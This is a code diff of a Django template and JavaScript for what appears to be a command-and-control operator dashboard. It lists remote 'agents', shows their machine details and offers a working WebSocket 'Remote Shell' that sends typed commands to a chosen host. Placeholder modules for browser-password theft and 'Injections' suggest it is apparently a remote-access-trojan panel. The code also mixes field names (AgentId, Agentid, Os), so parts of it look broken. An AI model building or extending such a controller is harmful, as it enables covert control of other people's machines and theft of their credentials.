@@ -1,351 +1,870 @@
+{% load static %}
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
+  <title>Scrollable Client Cards (Dynamic, No innerHTML)</title>
+
+  <!-- Animate.css for flip effect -->
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"
+  />
+
   <style>
-    /* Minimal styling for demonstration */
-    .tabs-container {
-      display: flex;
-      gap: 8px;
-      margin-bottom: 16px;
+    :root {
+      --sidebar-width: 280px;
+      --sidebar-collapsed-width: 70px;
+
+      --sidebar-bg-start: #0c0f14;
+      --sidebar-bg-end: #10131a;
+      --accent-color: #497ea5;
+      --text-color: #ffffff;
+      --border-radius: 16px;
+      --font-body: 'Rajdhani', sans-serif;
+      --font-heading: 'Orbitron', sans-serif;
     }
-    .tab {
-      background: #497ea5;
-      color: #000;
-      padding: 6px 12px;
-      border-radius: 4px;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-    }
-    .tab.active {
-      background: #006fa1;
-      color: #fff;
+
+    /* Emphasize "All Clients" tab */
+    #allClients {
       font-weight: bold;
     }
-    .tab-close {
-      margin-left: 8px;
-      cursor: pointer;
-    }
-    .client-card {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      margin-bottom: 8px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      padding: 8px;
-    }
-    .client-card h4 {
-      margin: 0;
-    }
-    .activate-btn {
-      margin-left: auto;
-      cursor: pointer;
-      background: #497ea5;
-      border: none;
-      border-radius: 4px;
+
+    /* Modules buttons styling, as you had before */
+    .dropdown.modules button {
+      padding: 6px 14px;
+      background-color: var(--accent-color);
       color: #000;
-      padding: 6px 12px;
+      border-radius: var(--border-radius);
+      cursor: pointer;
+      font-size: 0.85rem;
+      border: none;
+      transition: background-color 0.3s;
+      align-self: center;
+      height: 35px;
     }
-    .activate-btn:hover {
-      background: #006fa1;
-      color: #fff;
+    .dropdown.modules button:hover {
+      background-color: #006fa1;
     }
+    .dropdown.modules button.active {
+      color: white;
+      background-color: #006fa1;
+      font-weight: bold;
+    }
+
+    /* The active-client-tab container */
     .active-client-tab {
+      position: relative;
       display: none;
-      border: 1px solid #ccc;
-      padding: 8px;
-      margin-bottom: 16px;
+      padding: 20px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: var(--border-radius);
+      margin-top: 20px;
     }
     .active-client-tab.active {
       display: block;
     }
-    .machine-info-table td {
-      padding: 4px 8px;
-      vertical-align: top;
+
+    /* Chat panel */
+    .chat-slide-panel {
+      display: flex;
+      flex-direction: column;
+      border-radius: var(--border-radius);
+      margin-top: 1rem;
+      overflow: hidden;
+      height: 30rem; /* just a fixed height for demonstration */
+    }
+    .chat-slide-header {
+      padding: 0.75rem 1rem;
+      font-family: var(--font-heading);
+      color: #fff;
+      border-top-left-radius: var(--border-radius);
+      border-top-right-radius: var(--border-radius);
+      background:
+        linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)),
+        url("{% static 'images/chat-shell-header.jpg' %}");
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      box-shadow: inset 0 -1px 2px rgba(0, 0, 0, 0.4);
+      border-bottom: 1px solid grey;
+      display: flex; 
+      justify-content: space-between;
+    }
+    .chat-slide-body {
+      flex: 1;
+      padding: 0.75rem 1rem;
+      overflow-y: auto;
+      background:
+        linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)),
+        url("{% static 'images/chat-shell-body.jpg' %}");
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+    .chat-slide-footer {
+      display: flex;
+      background: #252525;
+      gap: 0.5rem;
+      padding: 0.75rem 1rem;
+      border-bottom-left-radius: var(--border-radius);
+      border-bottom-right-radius: var(--border-radius);
+    }
+    .message-row {
+      display: flex;
+      margin-bottom: 0.5rem;
+    }
+    .message-row.right {
+      justify-content: flex-end;
+    }
+    .message-row.left {
+      justify-content: flex-start;
+    }
+    .message-bubble {
+      background: #333;
+      color: #fff;
+      padding: 0.5rem 0.8rem;
+      border-radius: var(--border-radius);
+      max-width: 70%;
+      word-wrap: break-word;
+    }
+    .message-row.right .message-bubble {
+      background: var(--accent-color);
+      color: #000;
+    }
+    .chat-input {
+      flex: 1;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: var(--border-radius);
+      background: #1e1e1e;
+      color: #fff;
+      padding: 0.4rem 0.6rem;
+    }
+    .chat-send-btn {
+      background: var(--accent-color);
+      color: #000;
+      border: none;
+      border-radius: var(--border-radius);
+      padding: 0.5rem 1rem;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .chat-send-btn:hover {
+      background: #006fa1;
+      color: #fff;
+    }
+
+    /* The mini navbar in .active-client-tab */
+    .active-client-tab .navbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 1rem;
+      background: rgba(255, 255, 255, 0.05);
+      padding: 0.75rem 1rem;
+      border-radius: var(--border-radius);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    .active-client-tab .navbar h3 {
+      margin: 0;
+      font-family: var(--font-heading);
+      font-size: 1.2rem;
+      color: var(--accent-color);
+    }
+    .active-client-tab .modules {
+      display: flex;
+      gap: 0.5rem;
+    }
+    .active-client-tab p {
+      color: #ccc;
+      margin-bottom: 0.5rem;
+    }
+
+    /* The main content area, tabs, container, etc. */
+    .main-content {
+      margin-left: var(--sidebar-width);
+      min-height: 100vh;
+      padding: 2rem;
+      transition: margin-left 0.4s ease;
+      overflow-y: auto;
+    }
+    .tabs-container {
+      display: flex;
+      background-color: #1a1d24;
+      padding: 10px;
+      border-radius: var(--border-radius);
+      margin-bottom: 20px;
+    }
+    .tab {
+      padding: 10px 20px;
+      margin-right: 10px;
+      background-color: var(--accent-color);
+      color: black;
+      border-radius: var(--border-radius);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+    }
+    .tab:hover {
+      background-color: #006fa1;
+    }
+    .tab.active {
+      background-color: #006fa1;
+      color: white;
+      font-weight: bold;
+    }
+    .tab-close {
+      font-size: 1.2em;
+      margin-left: 10px;
+      cursor: pointer;
+      color: #999;
+    }
+    .scrollable-container {
+      max-height: 80vh;
+      overflow-y: auto;
+      margin: 0 -20px;
+      padding: 0 20px;
+    }
+
+    /* The client cards themselves */
+    .client-card {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: var(--border-radius);
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+      color: #fff;
+      margin: 10px 0;
+      padding: 16px;
+      text-align: center;
+      transition: transform 0.3s;
+      display: flex;
+      align-items: center;
+    }
+    .client-card:hover {
+      transform: translateY(-5px);
+    }
+    .client-card h4 {
+      font-size: 1.1rem;
+      color: var(--accent-color);
+      margin-bottom: 10px;
+      font-family: var(--font-heading);
+      margin-right: 16px;
+    }
+    .client-card .client-icon {
+      width: 50px; 
+      height: 50px;
+      border-radius: var(--border-radius);
+      margin: 0 auto 0px auto;
+      display: flex; 
+      justify-content: center; 
+      align-items: center;
+      color: #000; 
+      font-size: 1.2em;
+    }
+    .client-icon > img {
+      height: -webkit-fill-available;
+    }
+
+    .client-info {
+      display: flex; 
+      flex-direction: column;
+      color: #ddd;
+      font-size: 0.9em;
+      margin-right: auto;
+    }
+    .client-info span {
+      margin-bottom: 4px;
+    }
+    .activate-btn {
+      padding: 6px 14px;
+      background-color: var(--accent-color);
+      color: #000; 
+      border-radius: var(--border-radius);
+      cursor: pointer; 
+      font-size: 0.85rem; 
+      border: none;
+      transition: background-color 0.3s; 
+      align-self: center; 
+      height: 42px;
+    }
+    .activate-btn:hover {
+      background-color: #006fa1;
+      color: #fff;
+    }
+
+    /* Custom scrollbar styling */
+    ::-webkit-scrollbar {
+      width: 8px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #1c1f24;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #444;
+      border-radius: 4px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #555;
     }
   </style>
 </head>
+
 <body>
-  <main>
-    <!-- 1) Tabs Section -->
-    <div class="tabs-container" id="agent-tabs-container">
-      <div class="tab active" data-tab="all-clients" id="allClientsTab">All Clients</div>
-    </div>
+<main class="main-content">
+  <!-- Tabs Section -->
+  <div class="tabs-container" id="client-tabs-container">
+    <div class="tab active" data-tab="all-clients" id="allClients">All Clients</div>
+  </div>
 
-    <!-- 2) Dynamic Tab Content -->
-    <div id="agent-tab-content"></div>
+  <!-- Dynamic Tab Content -->
+  <div id="client-tab-content"></div>
 
-    <!-- 3) Scrollable container for client cards -->
-    <div id="clientsContainer"></div>
-  </main>
+  <!-- Scrollable container for client cards -->
+  <div class="scrollable-container" id="clientsContainer">
+    <!-- We'll dynamically insert client cards here from /api/agents -->
+  </div>
+</main>
 
-  <script>
-    "use strict";
+<script>
+"use strict";
 
-    // We'll store references to frequently accessed elements here
-    const domRefs = {
-      tabsContainer: document.getElementById("agent-tabs-container"),
-      tabContent: document.getElementById("agent-tab-content"),
-      clientsContainer: document.getElementById("clientsContainer"),
-      allClientsTab: document.getElementById("allClientsTab")
-    };
 
-    // Store all tabs/panels in-memory for quick access
-    // e.g. { "Machine1": { tabEl: <div>, panelEl: <div> }, ... }
-    const clientTabsMap = {};
+const chatHistory = {};
+const socketMap = {};
+const clientTabsMap = {};
 
-    // We also keep a chatHistory or similar if needed, but let's focus on machine info for now.
+// Shortcut to references
+const domRefs = {
+  tabsContainer: document.getElementById("client-tabs-container"),
+  tabContent: document.getElementById("client-tab-content"),
+  clientsContainer: document.getElementById("clientsContainer"),
+  allClientsTab: document.getElementById("allClients")
+};
 
-    // 1) On page load, fetch the list of agents and build the cards.
-    window.addEventListener("DOMContentLoaded", async () => {
-      try {
-        const agents = await fetchAgents();
-        renderClientCards(agents);
-      } catch (err) {
-        console.error("Failed to fetch agents:", err);
+/* On page load, fetch /api/agents and build cards. Then handle "All Clients" tab. */
+window.addEventListener("DOMContentLoaded", async () => {
+  try {
+    const agents = await fetchAgents();
+    renderClientCards(agents);
+  } catch (err) {
+    console.error("Failed to fetch agents:", err);
+  }
+
+  domRefs.allClientsTab.addEventListener("click", showAllClients);
+});
+
+/**
+ * 1) Fetch the list of agents from /api/agents
+ *    e.g. [{ "HostName": "SomePC", "os": "Windows 10", "Agentid": "Machine1" }, ...]
+ */
+async function fetchAgents() {
+  const response = await fetch("/api/v2/agents");
+  if (!response.ok) {
+    throw new Error("Failed to fetch agents: " + response.status);
+  }
+  return response.json();
+}
+
+/**
+ * 2) Build a card for each agent in the #clientsContainer.
+ *    No innerHTML—pure DOM creation. We set up .activate-btn to call activateClient.
+ */
+function renderClientCards(agents) {
+  // Clear old
+  domRefs.clientsContainer.textContent = "";
+
+  agents.forEach(agent => {
+    const card = document.createElement("div");
+    card.classList.add("row", "client-card");
+    card.dataset.clientName = agent.Agentid;
+
+    // Title
+    const h4 = document.createElement("h4");
+    h4.textContent = agent.HostName;
+    card.appendChild(h4);
+
+    // Optional OS icon logic:
+    const iconDiv = document.createElement("div");
+    iconDiv.classList.add("client-icon");
+    let iconSrc = "{% static 'images/windows.svg' %}";
+    const osLower = agent.Os.toLowerCase();
+    if (osLower.includes("linux")) {
+      iconSrc = "{% static 'images/linux.png' %}";
+    } else if (osLower.includes("mac") || osLower.includes("os x")) {
+      iconSrc = "{% static 'images/apple.png' %}";
+    }
+    const osImg = document.createElement("img");
+    osImg.src = iconSrc;
+    osImg.alt = "OS Icon";
+    iconDiv.appendChild(osImg);
+    card.appendChild(iconDiv);
+
+    // Basic OS info (the partial from /api/agents)
+    const infoDiv = document.createElement("div");
+    infoDiv.classList.add("col", "client-info");
+    const osSpan = document.createElement("span");
+    osSpan.textContent = "OS: " + agent.Os;
+    infoDiv.appendChild(osSpan);
+    card.appendChild(infoDiv);
+
+    // Activate button
+    const activateBtn = document.createElement("button");
+    activateBtn.classList.add("col-1", "activate-btn");
+    activateBtn.textContent = "Activate";
+    activateBtn.addEventListener("click", () => activateClient(agent));
+    card.appendChild(activateBtn);
+
+    domRefs.clientsContainer.appendChild(card);
+  });
+}
+
+/**
+ * 3) Activate client => create a tab + detail panel
+ *    Then fetch machine info from /api/modules/collection/machine_info/{Agentid}/basic
+ */
+async function activateClient(agent) {
+  const Agentid  = agent.AgentId;
+
+  // If tab already exists, just open it
+  if (clientTabsMap[Agentid]) {
+    openTab(Agentid);
+    return;
+  }
+
+  // Highlight the card border
+  const card = domRefs.clientsContainer.querySelector('[data-client-name="' + Agentid + '"]');
+  if (card) {
+    card.style.border = "3px solid #006fa1";
+  }
+
+  // Create a new tab
+  const newTab = document.createElement("div");
+  newTab.classList.add("tab");
+  newTab.dataset.tab = Agentid;
+  newTab.textContent = agent.HostName;
+
+  // Close button
+  const closeBtn = document.createElement("span");
+  closeBtn.textContent = "×";
+  closeBtn.classList.add("tab-close");
+  closeBtn.addEventListener("click", (event) => {
+    event.stopPropagation();
+    closeTab(Agentid);
+  });
+  newTab.appendChild(closeBtn);
+
+  newTab.addEventListener("click", () => openTab(Agentid));
+  domRefs.tabsContainer.appendChild(newTab);
+
+  // Build the detail panel
+  const detailDiv = document.createElement("div");
+  detailDiv.classList.add("active-client-tab");
+  detailDiv.dataset.client = Agentid;
+  domRefs.tabContent.appendChild(detailDiv);
+
+  // Keep references so we can open/close easily
+  clientTabsMap[Agentid] = {
+    tabEl: newTab,
+    panelEl: detailDiv
+  };
+
+  // Build the detail UI (navbar, modules, row container)
+  createClientDetails(agent);
+
+  // Finally, fetch the machine info for the default module => Machine Info
+  try {
+    const info = await fetchMachineInfo(Agentid);
+    // Show it in the "Machine Info" section
+    console.log(info)
+    renderMachineInfo(Agentid, info);
+  } catch (err) {
+    console.error("Failed to fetch machine info:", err);
+  }
+
+  // Open the tab
+  openTab(Agentid);
+}
+
+/**
+ * 4) Build the detail panel structure. We'll have:
+ *    <div class="navbar">
+ *      <h3>...</h3>
+ *      <div class="dropdown modules"> [ Machine Info | Remote Shell | ... ] </div>
+ *    </div>
+ *    <div class="row" data-client-modules-row="Agentid"></div>
+ */
+function createClientDetails(agent) {
+  const Agentid  = agent.AgentId;
+  const detailDiv = clientTabsMap[Agentid].panelEl;
+
+  // Clear if needed
+  while (detailDiv.firstChild) {
+    detailDiv.removeChild(detailDiv.firstChild);
+  }
+
+  // Navbar
+  const navBar = document.createElement("div");
+  navBar.classList.add("navbar");
+  
+  const h3 = document.createElement("h3");
+  h3.classList.add("optionHeader");
+  h3.dataset.optionHeader = Agentid;
+  h3.textContent = agent.Agentid + " Details";
+  navBar.appendChild(h3);
+
+  // Modules container
+  const modulesDiv = document.createElement("div");
+  modulesDiv.classList.add("dropdown", "modules");
+
+  // Machine Info button
+  const machineInfoBtn = document.createElement("button");
+  machineInfoBtn.classList.add("machineInfoButton", "active");
+  machineInfoBtn.textContent = "Machine Info";
+  machineInfoBtn.addEventListener("click", async () => {
+    // Toggle active
+    setActiveModule(Agentid, machineInfoBtn);
+    // Re-fetch or re-render machine info if needed
+    var info = await fetchMachineInfo(agent.Agentid);
+    console.log("info")
+    console.log(info)
+    renderMachineInfo(Agentid, info)
+
+  });
+  modulesDiv.appendChild(machineInfoBtn);
+
+  // Remote Shell button
+  const remoteShellBtn = document.createElement("button");
+  remoteShellBtn.classList.add("remoteShellButton");
+  remoteShellBtn.textContent = "Remote Shell";
+  remoteShellBtn.addEventListener("click", () => {
+    setActiveModule(Agentid, remoteShellBtn);
+    showRemoteShell(Agentid);
+  });
+  modulesDiv.appendChild(remoteShellBtn);
+
+  // The rest of the buttons (as placeholders)
+  const browserPassBtn = document.createElement("button");
+  browserPassBtn.classList.add("browserPassButton");
+  browserPassBtn.textContent = "Browser Passwowrds";
+  modulesDiv.appendChild(browserPassBtn);
+
+  const injectionsBtn = document.createElement("button");
+  injectionsBtn.classList.add("injectionsButton");
+  injectionsBtn.textContent = "Injections";
+  modulesDiv.appendChild(injectionsBtn);
+
+  const processesBtn = document.createElement("button");
+  processesBtn.classList.add("processesButton");
+  processesBtn.textContent = "Processes";
+  modulesDiv.appendChild(processesBtn);
+
+  navBar.appendChild(modulesDiv);
+  detailDiv.appendChild(navBar);
+
+  // A container for module content
+  const rowDiv = document.createElement("div");
+  rowDiv.classList.add("row");
+  rowDiv.dataset.clientModulesRow = Agentid;
+
+  detailDiv.appendChild(rowDiv);
+}
+
+/**
+ * We keep a function to set modules' "active" class in the navbar
+ */
+function setActiveModule(agentId, buttonEl) {
+  const detailDiv = clientTabsMap[agentId].panelEl;
+  const allButtons = detailDiv.querySelectorAll(".dropdown.modules button");
+  allButtons.forEach(btn => btn.classList.remove("active"));
+  buttonEl.classList.add("active");
+}
+
+/**
+ * 5) Fetch machine info from /api/modules/collection/machine_info/{Agentid}/basic
+ */
+ async function fetchMachineInfo(agentId) {
+  const url = `/api/v2/agents/?agent_id=${encodeURIComponent(agentId)}`; // Encode agentId for safety
+  const resp = await fetch(url);
+  
+  if (!resp.ok) {
+    throw new Error(`Failed to fetch machine info. Status: ${resp.status}, Message: ${resp.statusText}`);
+  }
+
+  const data = await resp.json();
+  
+  if (!Array.isArray(data) || data.length === 0) {
+    throw new Error("Invalid or empty response data received");
+  }
+
+  return data[0]; // Return the first item in the array
+}
+/**
+ * 6) Render the machine info table in the .row[data-client-modules-row=Agentid]
+ */
+function renderMachineInfo(agentId, info) {
+  const detailDiv = clientTabsMap[agentId].panelEl;
+  const rowDiv = detailDiv.querySelector('[data-client-modules-row="' + agentId + '"]');
+
+  // Clear out old content
+  while (rowDiv.firstChild) {
+    rowDiv.removeChild(rowDiv.firstChild);
+  }
+
+  // Build a <p> or <table> or anything.
+  // We'll do a simple table:
+  const fields = [
+    ["HostName", info.HostName],
+    ["OperatingSystem", info.OperatingSystem],
+    ["OSVersionDetail", info.OSVersionDetail],
+    ["CPU", info.CPU],
+    ["RAM", info.RAM],
+    ["Disk", info.Disk],
+    ["PrimaryIP", info.PrimaryIP],
+    ["GPU", info.GPU],
+    ["AgentStatus", info.AgentStatus],
+    ["LastLogin", info.LastLogin],
+    ["LogedInSessions", Array.isArray(info.LogedInSessions) ? info.LogedInSessions.join(", ") : ""]
+  ];
+
+  const fragment = document.createDocumentFragment();
+  fields.forEach(([label, value]) => {
+    const p = document.createElement("p");
+    p.textContent = label + ": " + (value || "");
+    fragment.appendChild(p);
+  });
+
+  rowDiv.appendChild(fragment);
+}
+
+/**
+ * 7) Show the remote shell module
+ */
+function showRemoteShell(agentId) {
+  const detailDiv = clientTabsMap[agentId].panelEl;
+  const rowDiv = detailDiv.querySelector('[data-client-modules-row="' + agentId + '"]');
+
+  // Clear out old
+  while (rowDiv.firstChild) {
+    rowDiv.removeChild(rowDiv.firstChild);
+  }
+
+  // Create the chat-slide-panel
+  const chatPanel = document.createElement("div");
+  chatPanel.classList.add("chat-slide-panel");
+  chatPanel.dataset.chatPanel = agentId;
+
+  // Header
+  const headerDiv = document.createElement("div");
+  headerDiv.classList.add("chat-slide-header");
+  const strongEl = document.createElement("strong");
+  strongEl.textContent = agentId + " - Remote Shell";
+  headerDiv.appendChild(strongEl);
+  chatPanel.appendChild(headerDiv);
+
+  // Body
+  const bodyDiv = document.createElement("div");
+  bodyDiv.classList.add("chat-slide-body");
+  bodyDiv.dataset.chatBody = agentId; // We'll use this for renderChatHistory
+  chatPanel.appendChild(bodyDiv);
+
+  // Footer
+  const footerDiv = document.createElement("div");
+  footerDiv.classList.add("chat-slide-footer");
+
+  const inputEl = document.createElement("input");
+  inputEl.type = "text";
+  inputEl.classList.add("chat-input");
+  inputEl.placeholder = "Type a command...";
+  inputEl.dataset.chatInput = agentId;
+  footerDiv.appendChild(inputEl);
+
+  const sendBtn = document.createElement("button");
+  sendBtn.classList.add("chat-send-btn");
+  sendBtn.textContent = "Send";
+  sendBtn.addEventListener("click", () => sendCommand(agentId));
+  footerDiv.appendChild(sendBtn);
+
+  chatPanel.appendChild(footerDiv);
+  rowDiv.appendChild(chatPanel);
+
+  inputEl.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") {
+      sendBtn.click();
+    }
+  });
+
+  // If no history, init
+  if (!chatHistory[agentId]) {
+    chatHistory[agentId] = [];
+  }
+
+  // Create or reuse the socket
+  getOrCreateSocket(agentId);
+
+  // Render existing chat
+  renderChatHistory(agentId);
+}
+
+/**
+ * Rerender chat history for agentId
+ */
+function renderChatHistory(agentId) {
+  const bodyDiv = document.querySelector('[data-chat-body="' + agentId + '"]');
+  if (!bodyDiv) return;
+
+  // Clear
+  while (bodyDiv.firstChild) {
+    bodyDiv.removeChild(bodyDiv.firstChild);
+  }
+
+  const history = chatHistory[agentId] || [];
+  history.forEach(msg => {
+    const row = document.createElement("div");
+    row.classList.add("message-row", msg.role === "user" ? "right" : "left");
+    const bubble = document.createElement("div");
+    bubble.classList.add("message-bubble");
+    bubble.textContent = msg.text;
+    row.appendChild(bubble);
+    bodyDiv.appendChild(row);
+  });
+
+  // scroll
+  bodyDiv.scrollTop = bodyDiv.scrollHeight;
+}
+
+/**
+ * Called when user hits send
+ */
+function sendCommand(agentId) {
+  const inputEl = document.querySelector('[data-chat-input="' + agentId + '"]');
+  if (!inputEl) return;
+  const userCmd = inputEl.value.trim();
+  if (!userCmd) return;
+
+  // Add to chat
+  if (!chatHistory[agentId]) {
+    chatHistory[agentId] = [];
+  }
+  chatHistory[agentId].push({ role: "user", text: userCmd });
+  renderChatHistory(agentId);
+
+  // Send over WebSocket
+  const socket = getOrCreateSocket(agentId);
+  socket.send(JSON.stringify({ command: userCmd }));
+
+  inputEl.value = "";
+}
+
+/* Show All Clients => revert to original card view */
+function showAllClients() {
+  // Deactivate all tabs
+  Object.values(clientTabsMap).forEach(({ tabEl }) => tabEl.classList.remove("active"));
+  // Hide all panels
+  Object.values(clientTabsMap).forEach(({ panelEl }) => panelEl.classList.remove("active"));
+  domRefs.allClientsTab.classList.add("active");
+
+  // Show all client cards again
+  domRefs.clientsContainer.querySelectorAll(".client-card").forEach((card) => {
+    card.style.display = "flex";
+    card.style.border = "";
+  });
+}
+
+/* Open a specific client tab => hide cards, show that detail */
+function openTab(agentId) {
+  // Hide all client cards
+  domRefs.clientsContainer.querySelectorAll(".client-card").forEach((c) => {
+    c.style.display = "none";
+  });
+
+  // Deactivate all tabs
+  domRefs.tabsContainer.querySelectorAll(".tab").forEach((tab) => tab.classList.remove("active"));
+  // Deactivate all panels
+  domRefs.tabContent.querySelectorAll(".active-client-tab").forEach((p) => p.classList.remove("active"));
+
+  const tabInfo = clientTabsMap[agentId];
+  if (tabInfo) {
+    tabInfo.tabEl.classList.add("active");
+    tabInfo.panelEl.classList.add("active");
+  }
+}
+
+/* Close the tab */
+function closeTab(agentId) {
+  const tabInfo = clientTabsMap[agentId];
+  if (!tabInfo) return;
+
+  // Remove from DOM
+  domRefs.tabsContainer.removeChild(tabInfo.tabEl);
+  domRefs.tabContent.removeChild(tabInfo.panelEl);
+  delete clientTabsMap[agentId];
+
+  // Remove highlight from card
+  const card = domRefs.clientsContainer.querySelector('[data-client-name="' + agentId + '"]');
+  if (card) {
+    card.style.border = "";
+  }
+
+  // Show "All Clients"
+  showAllClients();
+}
+
+/* Return or create a WebSocket for the given agent */
+function getOrCreateSocket(agentId) {
+  if (socketMap[agentId]) {
+    return socketMap[agentId];
+  }
+
+  const protocol = (window.location.protocol === "https:") ? "wss:" : "ws:";
+  const socketUrl = `${protocol}//${window.location.host}/ws/shell/${agentId}/`;
+  const newSocket = new WebSocket(socketUrl);
+
+  newSocket.onopen = () => {
+    console.log("WebSocket open for:", agentId);
+  };
+  newSocket.onmessage = (event) => {
+    const data = JSON.parse(event.data);
+    if (!chatHistory[agentId]) {
+      chatHistory[agentId] = [];
+    }
+    // Treat server messages as 'bot'
+    chatHistory[agentId].push({ role: "bot", text: data.message });
+    renderChatHistory(agentId);
+  };
+  newSocket.onerror = (err) => {
+    console.error("WebSocket error:", err);
+  };
+  newSocket.onclose = (evt) => {
+    console.log("WebSocket closed for:", agentId, evt.reason);
+    delete socketMap[agentId];
+  };
+
+  socketMap[agentId] = newSocket;
+  return newSocket;
+}
+
+/* Optional toggleChat animation logic from your snippet (unused) */
+function toggleChat(clientName) {
+  const chatPanel = document.querySelector('[data-chat-panel="' + clientName + '"]');
+  if (!chatPanel) return;
+
+  if (chatPanel.style.display === 'none' || chatPanel.style.display === '') {
+    chatPanel.style.display = 'block';
+    chatPanel.classList.remove('animate__flipOutX');
+    chatPanel.classList.add('animate__animated', 'animate__flipInX');
+  } else {
+    chatPanel.classList.remove('animate__flipInX');
+    chatPanel.classList.add('animate__flipOutX');
+    chatPanel.addEventListener('animationend', function handleFlipOut(e) {
+      if (e.animationName === 'flipOutX') {
+        chatPanel.style.display = 'none';
       }
-
-      // Show all clients if the "All Clients" tab is clicked
-      domRefs.allClientsTab.addEventListener("click", showAllClients);
+      chatPanel.classList.remove('animate__animated','animate__flipOutX');
+      chatPanel.removeEventListener('animationend', handleFlipOut);
     });
-
-    /**
-     * Fetch the agent list from /api/agents (GET).
-     * Expected: [{ "HostName": "PC-123", "os": "Windows 10", "Agentid": "Machine1" }, ...]
-     */
-    async function fetchAgents() {
-      const resp = await fetch("/api/agents");
-      if (!resp.ok) {
-        throw new Error("Failed to fetch agents: " + resp.statusText);
-      }
-      return resp.json();
-    }
-
-    /**
-     * Render a card for each agent in the #clientsContainer
-     * No innerHTML, we build each card using DOM.
-     */
-    function renderClientCards(agents) {
-      // Clear old data
-      domRefs.clientsContainer.textContent = "";
-
-      for (const agent of agents) {
-        // Create card
-        const card = document.createElement("div");
-        card.classList.add("client-card");
-        card.dataset.agentId = agent.Agentid; // store the agent's ID
-
-        // Create the heading
-        const title = document.createElement("h4");
-        title.textContent = agent.HostName;
-        card.appendChild(title);
-
-        // OS info (just text, as requested)
-        const osInfo = document.createElement("span");
-        osInfo.textContent = `OS: ${agent.os}`;
-        card.appendChild(osInfo);
-
-        // Activate button
-        const activateBtn = document.createElement("button");
-        activateBtn.classList.add("activate-btn");
-        activateBtn.textContent = "Activate";
-        activateBtn.addEventListener("click", () => activateClient(agent));
-        card.appendChild(activateBtn);
-
-        // Add to container
-        domRefs.clientsContainer.appendChild(card);
-      }
-    }
-
-    /**
-     * 2) Activate a client => create a tab + detail panel
-     *    Also fetch machine info from /api/modules/collection/machine_info/{Agentid}/basic
-     */
-    async function activateClient(agent) {
-      // If we already have a tab for this agent, just open it
-      if (clientTabsMap[agent.Agentid]) {
-        openTab(agent.Agentid);
-        return;
-      }
-
-      // Create a new tab
-      const tabEl = document.createElement("div");
-      tabEl.classList.add("tab");
-      tabEl.dataset.tab = agent.Agentid;
-      tabEl.textContent = agent.HostName;
-
-      // Add a close button
-      const closeBtn = document.createElement("span");
-      closeBtn.classList.add("tab-close");
-      closeBtn.textContent = "×";
-      closeBtn.addEventListener("click", (e) => {
-        e.stopPropagation();
-        closeTab(agent.Agentid);
-      });
-      tabEl.appendChild(closeBtn);
-
-      // Clicking on the tab opens that client's panel
-      tabEl.addEventListener("click", () => openTab(agent.Agentid));
-
-      // Insert tab
-      domRefs.tabsContainer.appendChild(tabEl);
-
-      // Create detail panel
-      const panelEl = document.createElement("div");
-      panelEl.classList.add("active-client-tab");
-      panelEl.dataset.client = agent.Agentid;
-
-      // We'll eventually fill Machine Info below
-      domRefs.tabContent.appendChild(panelEl);
-
-      // Store references
-      clientTabsMap[agent.Agentid] = {
-        tabEl: tabEl,
-        panelEl: panelEl
-      };
-
-      // Then fetch the machine info and show it
-      try {
-        const machineInfo = await fetchMachineInfo(agent.Agentid);
-        buildMachineInfoPanel(panelEl, agent.Agentid, machineInfo);
-      } catch (err) {
-        console.error("Failed to fetch machine info:", err);
-      }
-
-      // Open the tab
-      openTab(agent.Agentid);
-    }
-
-    /**
-     * Fetch machine info from /api/modules/collection/machine_info/{Agentid}/basic
-     */
-    async function fetchMachineInfo(agentId) {
-      const resp = await fetch(`/api/modules/collection/machine_info/${agentId}/basic`);
-      if (!resp.ok) {
-        throw new Error("Failed to fetch machine info: " + resp.statusText);
-      }
-      return resp.json();
-    }
-
-    /**
-     * Dynamically build a "Machine Info" table (or any layout) inside the given panelEl.
-     * No innerHTML, purely createElement + textContent.
-     */
-    function buildMachineInfoPanel(panelEl, agentId, info) {
-      // Clear old content if any
-      while (panelEl.firstChild) {
-        panelEl.removeChild(panelEl.firstChild);
-      }
-
-      // Title
-      const title = document.createElement("h3");
-      title.textContent = `${agentId} Machine Info`;
-      panelEl.appendChild(title);
-
-      // Build a table
-      const table = document.createElement("table");
-      table.classList.add("machine-info-table");
-
-      // Helper to create row
-      function createRow(label, value) {
-        const tr = document.createElement("tr");
-
-        const tdLabel = document.createElement("td");
-        tdLabel.textContent = label + ": ";
-        tr.appendChild(tdLabel);
-
-        const tdValue = document.createElement("td");
-        // If it’s an array (e.g., LogedInSessions), join them
-        if (Array.isArray(value)) {
-          tdValue.textContent = value.join(", ");
-        } else {
-          tdValue.textContent = value;
-        }
-        tr.appendChild(tdValue);
-
-        return tr;
-      }
-
-      // Create rows
-      table.appendChild(createRow("Hostname", info.HostName));
-      table.appendChild(createRow("Operating System", info.OperatingSystem));
-      table.appendChild(createRow("OS Version Detail", info.OSVersionDetail));
-      table.appendChild(createRow("CPU", info.CPU));
-      table.appendChild(createRow("RAM", info.RAM));
-      table.appendChild(createRow("Disk", info.Disk));
-      table.appendChild(createRow("PrimaryIP", info.PrimaryIP));
-      table.appendChild(createRow("GPU", info.GPU));
-      table.appendChild(createRow("AgentStatus", info.AgentStatus));
